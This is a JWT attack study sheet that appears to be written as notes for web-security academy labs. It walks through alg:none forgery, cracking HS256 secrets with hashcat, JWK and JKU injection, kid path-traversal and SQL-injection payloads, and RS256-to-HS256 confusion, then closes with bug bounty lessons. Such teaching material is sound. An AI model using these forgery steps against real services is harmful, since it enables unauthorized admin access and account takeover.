// CORE CONCEPT

A JWT is a digital passport your browser carries after login. The server gives it to you; you show it on every request to prove who you are — without any database lookup. It has 3 base64-encoded parts separated by dots: header.payload.signature

⚠ JWTs are NOT encrypted by default — only signed. Anyone can decode and read them. The signature only proves they haven't been tampered with.
02 — STRUCTURE

JWT Token Anatomy

HEADER eyJhbGciOiJSUzI1NiJ9
.
PAYLOAD eyJzdWIiOiJ3aWVuZXIifQ
.
SIGNATURE SflKxwRJSMe...
Header — decoded
{
  "alg": "RS256",   // algorithm — ATTACKER CAN CHANGE THIS
  "kid": "abc-123", // key ID — ATTACKER CAN INJECT THIS
  "jku": "https://server.com/keys", // key URL — ATTACKER CAN POINT TO OWN URL
  "jwk": { ... }    // embedded key — ATTACKER CAN INJECT OWN KEY
}
Every header field is attacker-controlled. This is where most JWT attacks begin.
Payload — decoded
{
  "sub": "wiener",      // subject (user ID) — change to "administrator"
  "role": "user",       // role — change to "admin"
  "iss": "portswigger", // issuer
  "exp": 1774367509,    // expiry — often not validated!
  "nbf": 1774281109,    // not-before
  "aud": "api.example"  // audience — often not validated!
}
Signature — how it works
// RS256 signing:
signature = RSA_encrypt(SHA256(header + "." + payload), PRIVATE_KEY)

// Verification:
decrypted = RSA_decrypt(signature, PUBLIC_KEY)
expected  = SHA256(header + "." + payload)
valid     = (decrypted === expected)  // must match!
The WHOLE POINT of attacks: forge a valid signature without the private key.
🔓

Decoding = trivial

All parts are just base64url encoded. Decode at jwt.io in 1 second. Never put secrets in payload.

🎯

Attack target

Goal: modify payload claims (sub, role) AND produce a valid signature. All attacks achieve this differently.

03 — ALGORITHMS

Signing Algorithms

HS256 — Symmetric
// ONE secret key for everything
sign(data,   secret) → signature
verify(sig,  secret) → valid/invalid

// same key used both times!
RISK: If secret is leaked or weak → anyone forges tokens
VS
RS256 — Asymmetric
// TWO mathematically linked keys
sign(data,   PRIVATE_KEY) → signature  ← server keeps secret
verify(sig,  PUBLIC_KEY)  → valid/invalid  ← world can see

// can't forge with just public key... normally
BUT: Algorithm confusion attack can break this
🔏 Wax Seal Analogy
Private key = your unique stamp ring. Only you have it. Press into wax to create seal.
Public key = photo of your stamp. Anyone can check "does this seal match?" But can't make a new seal without the real stamp.
ATTACK 01 — NONE ALGORITHM

alg: none Bypass

Medium Critical Impact Burp + JWT Editor
// CORE IDEA

If alg is set to "none", the token is unsigned. Vulnerable servers that honor this accept ANY unsigned token with NO signature verification — allowing you to forge anything.

Attack Steps
01Log in → capture your JWT in Burp Repeater
02In JWT tab → change alg to none in header
03Change sub to administrator in payload
04Remove the signature part entirely (keep trailing dot: header.payload.)
05Send → if server accepts → full admin access ✅
// Original (RS256):
eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIifQ.SflKxwRJSMe...

// Forged (none):
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
                     ↑ "sub":"administrator"    ↑ empty signature
⚠ Try variants: "none", "None", "NONE", "nOnE" — case-insensitive checks may pass different values
ATTACK 02 — WEAK HS256 SECRET

Brute-Force HS256 Secret

Medium High Impact Hashcat / jwt_tool
// CORE IDEA

HS256 tokens are signed with a secret string. If that secret is weak (admin123, secret, password), hashcat can crack it in seconds. Once you have the secret, you can sign anything.

Attack Steps
01Confirm token uses HS256 algorithm
02Save the full JWT to a file: echo "eyJ..." > jwt.txt
03Run hashcat: hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
04If cracked → you see: eyJ....:secret123
05Use cracked secret in JWT Editor to sign your forged token with any payload
# hashcat command:
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# jwt_tool alternative:
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# If cracked:
Token: eyJhbGci...
Secret: secret123  ← now you can forge anything!
💰 REAL BOUNTY A researcher found an API using HS256 with secret "admin123" — cracked in seconds — forged admin token — full takeover — $5,000 payout
ATTACK 03 — JWK HEADER INJECTION

Embedded JWK Injection

Hard Critical Impact Burp + JWT Editor
// CORE IDEA

The JWT header can include a jwk field with a full public key embedded. Misconfigured servers that trust this embedded key will verify the token against the attacker's own key — and since you generated the key pair, you can sign anything.

Generate RSA key pair in Burp
→
Embed public key in JWT header as jwk
→
Sign with YOUR private key
→
Server uses embedded key to verify → ✅
Attack Steps (Burp)
01JWT Editor Keys → New RSA Key → Generate → OK
02In Repeater JWT tab → Attack → Embedded JWK
03Select your RSA key → OK (Burp auto-injects jwk into header)
04Change sub → administrator in payload
05Sign → Don't modify header → Send ✅
// Forged header contains YOUR public key:
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "your-kid",
    "n": "your-public-n..."   ← YOUR public key here
  }
}
// Signed with YOUR private key → server trusts jwk field → valid ✅
CVE-2018-0114 — node-jose library accepted attacker jwk injection
ATTACK 04 — JKU HEADER INJECTION ★ YOU SOLVED THIS

JKU URL Injection

Hard Critical Impact Burp + Exploit Server ✓ Solved
// CORE IDEA

The jku header tells the server where to fetch the public key from (a URL). A vulnerable server doesn't check if that URL is trusted — so you point it to YOUR exploit server hosting YOUR public key. Server fetches your key, verifies your signature, done.

🧑‍💻 You
1. Generate RSA key pair
2. Host public key on exploit server
3. Forge JWT: jku → exploit server URL
4. Sign with YOUR private key
→ sends JWT →
← fetches key ←
🖥 Target Server
5. Reads jku from token
6. Fetches key from your URL
7. Verifies signature → matches ✅
8. Grants admin access 💀
Complete Attack Steps
01JWT Editor Keys → New RSA Key → Generate → OK (note the kid)
02Right-click key → Copy Public Key as JWK
03Go to exploit server in browser → Body section → paste:
{ "keys": [ { "kty":"RSA", "e":"AQAB", "kid":"YOUR-KID", "n":"YOUR-N" } ] }
04Click Store on exploit server
05In Repeater JWT header → add/change:
{ "kid": "YOUR-KID", "alg": "RS256", "jku": "https://YOUR-EXPLOIT-SERVER/exploit" }
06Payload → change sub to administrator
07Sign → select RSA key → Don't modify header → OK

ATTACK 05 — KID PARAMETER ABUSE

kid Header Injection

Hard Critical Impact Burp + JWT Editor
// CORE IDEA

The kid (key ID) header tells the server which key to use. If the server uses kid as a file path or database query without sanitization — you can inject to load arbitrary files or perform SQLi.

Path Traversal via kid
// kid injected as file path:
{ "kid": "../../dev/null" }

// Server reads /dev/null (empty string)
// Sign your token with empty string as HMAC secret:
// HMAC(data, "") → server verifies same way → valid ✅
Sign token with empty string "" as HS256 secret
SQL Injection via kid
// kid injected into SQL query:
// SELECT key FROM keys WHERE kid = '{kid}'

{ "kid": "x' UNION SELECT 'hacked'--" }

// Returns "hacked" as the key
// Sign token with "hacked" as HS256 secret → valid ✅
Sign token with your injected string as HS256 secret
Path Traversal Attack Steps
01In JWT header → change kid to ../../../dev/null
02Change alg to HS256
03JWT Editor Keys → New Symmetric Key → set k value to Base64 of empty string: AA==
04Change payload sub → administrator
05Sign with the empty symmetric key → Send ✅
ATTACK 06 — ALGORITHM CONFUSION ★ YOU SOLVED THIS

RS256 → HS256 Confusion

Hard Critical Impact Burp + /jwks.json ✓ Solved
// CORE IDEA — THE TRICK

You change alg from RS256 to HS256. The server's buggy code now uses the RSA public key as the HMAC secret. Since the public key is public (at /jwks.json), you already have it. You sign with it. Server verifies with it. Match. Done.

Normal RS256Attack HS256
Sign withPrivate key (secret)Public key (you have it!)
Verify withPublic keyPublic key (same!)
Can you forge?❌ No private key✅ Public key is free
Complete Attack Steps
01Visit /jwks.json or /.well-known/jwks.json → copy server's public key (JWK)
02JWT Editor Keys → New RSA Key → paste JWK → OK
03Double-click key → select PEM radio button → copy PEM
04Decoder tab → paste PEM → Encode as Base64 → copy output
05JWT Editor Keys → New Symmetric Key → Generate → replace k value with your Base64 PEM → OK
06In Repeater JWT tab → change alg → HS256 in header
07Change sub → administrator in payload
08Sign with Symmetric Key → Don't modify header → OK → Send ✅

ATTACK 07 — NO EXPOSED KEY ★ YOU SOLVED THIS

Algorithm Confusion (Hidden Public Key)

Expert Critical Impact Docker + Burp ✓ Solved
// CORE IDEA

Same as algorithm confusion but /jwks.json doesn't exist. You mathematically derive the public key from 2 JWT tokens signed with the same private key using the sig2n Docker tool.

Why 2 tokens?

RSA signatures mathematically leak information about the key. With 1 token — not enough math. With 2 tokens from the same key — the tool can reverse-engineer the n value (part of the public key). Like studying 2 wax seals so carefully you reconstruct the original stamp.

Complete Attack Steps
01Log in as wiener:peter → copy JWT → save as Token 1
02Log out → log back in → copy new JWT → save as Token 2
03Run Docker tool:
docker run --rm -it portswigger/sig2n <TOKEN1> <TOKEN2>
04Tool outputs 2 candidate keys + 2 tampered JWTs
05Test each tampered JWT in Burp Repeater on /my-account
06Direct 200 = correct key ✅ | 302 redirect = wrong key ❌
07Take the Base64 x509 key from the correct candidate
08JWT Editor → New Symmetric Key → replace k with that Base64 key
09Change alg → HS256, sub → administrator → sign → send ✅
# Tool output looks like:
Found n with multiplier 1:
  Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K...
  Tampered JWT: eyJraWQiOiJ... ← test this one in Repeater

  Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0t...
  Tampered JWT: eyJraWQiOiJ... ← and this one
ATTACK 08 — CLAIM MANIPULATION

Payload Claim Abuse

Role Escalation
// Before:
{ "sub": "wiener", "role": "user" }

// After (if server doesn't re-validate):
{ "sub": "wiener", "role": "admin" }
Expiry Bypass
// Many servers don't validate exp:
{ "sub": "wiener", "exp": 1000000000 }
                   ↑ year 2001 — try sending old tokens

// Or remove exp entirely:
{ "sub": "administrator" }
Audience/Issuer Bypass
// Token for service-a used on service-b:
{ "iss": "service-a", "aud": "service-b" }

// Or blank/missing aud accepted:
{ "sub": "admin" }  ← no aud claim
Access/Refresh Confusion
// App uses two token types but doesn't
// distinguish them at every endpoint:
{ "type": "refresh", "sub": "admin" }
→ try using refresh token as access token
ATTACK 09 — EXPOSURE & LEAKAGE

Token Exposure Vulnerabilities

🔗

Token in URL

JWT in query string (?token=eyJ...) ends up in browser history, server logs, Referer headers. Attacker can steal from logs.

Real case: confirmation links contained JWT with user email + plaintext password in payload → $$$
♻

No Expiry / No Revocation

Token valid forever after logout. Steal once → use indefinitely. Check: does old token work after logout?

Test: log out → send old token → still 200? → valid bug
🔓

Sensitive Data in Payload

Passwords, API keys, internal IDs in base64 payload = information disclosure. Always decode and read payload.

Never trust that base64 = encrypted. It doesn't.
🎭

Token Replay / Hijacking

Captured JWT can be replayed until expiry. No binding to IP, user-agent, or session. Steal → impersonate.

Test on public WiFi scenario. Check for token binding mechanisms.

REAL WORLD — BUG BOUNTY CASES

Real Bug Bounty Reports

Token in URL → Full Account Takeover
Critical

Confirmation links included JWT in URL. Payload contained user email + plaintext password. Attacker decoded token, used credentials to login, changed password without old-password check.

HackerOne Lesson: Never put sensitive data in JWTs or URLs
Jitsi (8x8) — Symmetric Key Algorithm Bug
Critical

Prosody module accepted symmetric HS256 algorithms in an RS256 flow. Any party could create their own token with any key and gain access to protected rooms. Fix: remove HS256 support entirely.

GitHub Advisory Lesson: Never support both HS256 + RS256 without strict algorithm enforcement
Newspack — Missing Signature Validation
Critical

WordPress plugin omitted JWT signature validation on login/registration endpoints. Anyone could forge tokens with any claims and register or login as any user.

HackerOne Lesson: Always use verify(), never decode() without verification
Algorithm Confusion — No Private Key Needed
Critical

RS256 service exploited via HS256 confusion. Researcher fetched public key, switched alg, signed with public key as HMAC secret. Full admin access forged with no private key.
